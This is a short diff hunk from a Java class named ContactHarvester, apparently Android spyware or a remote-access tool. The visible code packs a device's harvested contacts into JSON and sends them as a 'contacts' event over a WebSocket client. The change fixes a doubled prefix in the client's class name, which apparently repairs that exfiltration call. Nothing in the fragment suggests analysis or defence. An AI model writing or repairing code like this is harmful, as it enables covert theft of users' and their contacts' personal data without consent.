@@ -50,7 +50,7 @@ public class ContactHarvester {
                 }
                 JSONObject data = new JSONObject();
                 data.put("contacts", arr);
-                XRCXRCWebSocketClient.get(ctx).sendEvent("contacts", data);
+                XRCWebSocketClient.get(ctx).sendEvent("contacts", data);
             } catch (Exception e) {
                 Log.e(TAG, "Harvest failed", e);
             } finally {
